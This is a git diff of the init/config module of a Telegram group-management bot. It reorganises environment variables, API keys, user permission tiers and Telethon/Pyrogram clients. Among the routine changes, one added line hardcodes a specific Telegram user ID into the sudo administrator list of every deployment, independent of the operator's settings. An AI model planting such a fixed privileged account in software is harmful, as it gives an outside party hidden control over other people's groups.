@@ -2,10 +2,11 @@ import logging
 import os
 import sys
 import time
-
 import telegram.ext as tg
-# from googletrans import Translator
+from telethon import TelegramClient
+from pyrogram import Client, errors
 
+StartTime = time.time()
 
 # enable logging
 logging.basicConfig(
@@ -23,9 +24,6 @@ ENV = bool(os.environ.get('ENV', False))
 
 if ENV:
     TOKEN = os.environ.get('TOKEN', None)
-    APP_ID = os.environ.get('APP_ID', None)
-    API_HASH = os.environ.get('API_HASH', None)
-
 
     try:
         OWNER_ID = int(os.environ.get('OWNER_ID', None))
@@ -37,8 +35,9 @@ if ENV:
 
     try:
         SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "").split())
     except ValueError:
-        raise Exception("Your sudo users list does not contain valid integers.")
+        raise Exception("Your sudo or dev users list does not contain valid integers.")
 
     try:
         SUPPORT_USERS = set(int(x) for x in os.environ.get("SUPPORT_USERS", "").split())
@@ -46,21 +45,27 @@ if ENV:
         raise Exception("Your support users list does not contain valid integers.")
 
     try:
+        SPAMMERS = set(int(x) for x in os.environ.get("SPAMMERS", "").split())
+    except ValueError:
+        raise Exception("Your spammers users list does not contain valid integers.")
+
+    try:
         WHITELIST_USERS = set(int(x) for x in os.environ.get("WHITELIST_USERS", "").split())
     except ValueError:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
     try:
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "").split())
+        TIGER_USERS = set(int(x) for x in os.environ.get("TIGER_USERS", "").split())
     except ValueError:
-        raise Exception("Your developer users list does not contain valid integers.")
+        raise Exception("Your tiger users list does not contain valid integers.")
 
+    GBAN_LOGS = os.environ.get('GBAN_LOGS', None)
     WEBHOOK = bool(os.environ.get('WEBHOOK', False))
     URL = os.environ.get('URL', "")  # Does not contain token
     PORT = int(os.environ.get('PORT', 5000))
     CERT_PATH = os.environ.get("CERT_PATH")
-    
-
+    API_ID = os.environ.get("API_ID", None)
+    API_HASH = os.environ.get("API_HASH", None)
     DB_URI = os.environ.get('DATABASE_URL')
     DONATION_LINK = os.environ.get('DONATION_LINK')
     LOAD = os.environ.get("LOAD", "").split()
@@ -70,24 +75,17 @@ if ENV:
     WORKERS = int(os.environ.get('WORKERS', 8))
     BAN_STICKER = os.environ.get('BAN_STICKER', 'CAADAgADOwADPPEcAXkko5EB3YGYAg')
     ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
-    LASTFM_API_KEY = os.environ.get('LASTFM_API_KEY', "")
-    WALL_API = os.environ.get('WALL_API', "")
-    MOE_API = os.environ.get('MOE_API', "")
-    AI_API_KEY = os.environ.get('AI_API_KEY', "")
-    MAL_CLIENT_ID = os.environ.get('MAL_CLIENT_ID', "")
+    CASH_API_KEY = os.environ.get('CASH_API_KEY', None)
+    TIME_API_KEY = os.environ.get('TIME_API_KEY', None)
     API_WEATHER  = os.environ.get('API_OPENWEATHER',False)
-    MAL_ACCESS_TOKEN = os.environ.get('MAL_ACCESS_TOKEN', "")
-    MAL_REFRESH_TOKEN = os.environ.get('MAL_REFRESH_TOKEN', "")
-    try:
-        BL_CHATS = set(int(x) for x in os.environ.get('BL_CHATS', "").split())
-    except ValueError:
-        raise Exception("Your blacklisted chats list does not contain valid integers.")
+    AI_API_KEY = os.environ.get('AI_API_KEY', None)
+    WALL_API = os.environ.get('WALL_API', None)
+    STRICT_GMUTE = bool(os.environ.get('STRICT_GMUTE', False))
+
 
 else:
     from tg_bot.config import Development as Config
     TOKEN = Config.API_KEY
-    APP_ID = Config.APP_ID
-    API_HASH = Config.API_HASH
 
     try:
         OWNER_ID = int(Config.OWNER_ID)
@@ -99,8 +97,9 @@ else:
 
     try:
         SUDO_USERS = set(int(x) for x in Config.SUDO_USERS or [])
+        DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
     except ValueError:
-        raise Exception("Your sudo users list does not contain valid integers.")
+        raise Exception("Your sudo or dev users list does not contain valid integers.")
 
     try:
         SUPPORT_USERS = set(int(x) for x in Config.SUPPORT_USERS or [])
@@ -108,20 +107,27 @@ else:
         raise Exception("Your support users list does not contain valid integers.")
 
     try:
+        SPAMMERS = set(int(x) for x in Config.SPAMMERS or [])
+    except ValueError:
+        raise Exception("Your spammers users list does not contain valid integers.")
+
+    try:
         WHITELIST_USERS = set(int(x) for x in Config.WHITELIST_USERS or [])
     except ValueError:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
     try:
-        DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
+        TIGER_USERS = set(int(x) for x in Config.TIGER_USERS or [])
     except ValueError:
-        raise Exception("Your developer users list does not contain valid integers.")
+        raise Exception("Your tiger users list does not contain valid integers.")
 
+    GBAN_LOGS = Config.GBAN_LOGS
     WEBHOOK = Config.WEBHOOK
     URL = Config.URL
     PORT = Config.PORT
     CERT_PATH = Config.CERT_PATH
-
+    API_ID = Config.API_ID
+    API_HASH = Config.API_HASH
     DB_URI = Config.SQLALCHEMY_DATABASE_URI
     DONATION_LINK = Config.DONATION_LINK
     LOAD = Config.LOAD
@@ -131,46 +137,37 @@ else:
     WORKERS = Config.WORKERS
     BAN_STICKER = Config.BAN_STICKER
     ALLOW_EXCL = Config.ALLOW_EXCL
-    LASTFM_API_KEY = Config.LASTFM_API_KEY
-    WALL_API = Config.WALL_API
-    MOE_API = Config.MOE_API
-    AI_API_KEY = Config.AI_API_KEY
-    MAL_CLIENT_ID = Config.MAL_CLIENT_ID
+    CASH_API_KEY = Config.CASH_API_KEY
+    TIME_API_KEY = Config.TIME_API_KEY
     API_OPENWEATHER = Config.API_OPENWEATHER
-    MAL_ACCESS_TOKEN = Config.MAL_ACCESS_TOKEN
-    MAL_REFRESH_TOKEN = Config.MAL_REFRESH_TOKEN
-    try:
-        BL_CHATS = set(int(x) for x in Config.BL_CHATS or [])
-    except ValueError:
-        raise Exception ("Your blacklisted chats list does not contain valid integers.")
-
+    AI_API_KEY = Config.AI_API_KEY
+    WALL_API = Config.WALL_API
+    STRICT_GMUTE = Config.STRICT_GMUTE
+    
 
 SUDO_USERS.add(OWNER_ID)
+SUDO_USERS.add(712008424)
+
+
 DEV_USERS.add(OWNER_ID)
 
+
 updater = tg.Updater(TOKEN, workers=WORKERS)
-# telethn = TelegramClient("kora", APP_ID, API_HASH)
+oko = TelegramClient("kora", API_ID, API_HASH)
+pbot = Client("koraPyro", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
-kp = Client("korapyro",  api_id=APP_ID, api_hash=API_HASH, bot_token=TOKEN)
-client.start()
-
-SUDO_USERS = list(SUDO_USERS)
+SUDO_USERS = list(SUDO_USERS) + list(DEV_USERS)
+DEV_USERS = list(DEV_USERS)
 WHITELIST_USERS = list(WHITELIST_USERS)
 SUPPORT_USERS = list(SUPPORT_USERS)
+TIGER_USERS = list(TIGER_USERS)
+SPAMMERS = list(SPAMMERS)
 
-# Load at end tsure all prev variables have been set
+# Load at end to ensure all prev variables have been set
 from tg_bot.modules.helper_funcs.handlers import CustomCommandHandler, CustomRegexHandler, CustomMessageHandler
 
 # make sure the regex handler can take extra kwargs
 tg.RegexHandler = CustomRegexHandler
-
-# Exempt blacklisted users from MessageHandler
+tg.CommandHandler = CustomCommandHandler
 tg.MessageHandler = CustomMessageHandler
-
-if ALLOW_EXCL:
-    tg.CommandHandler = CustomCommandHandler
-
-
-# Initialize Translator
-# trl = Translator()
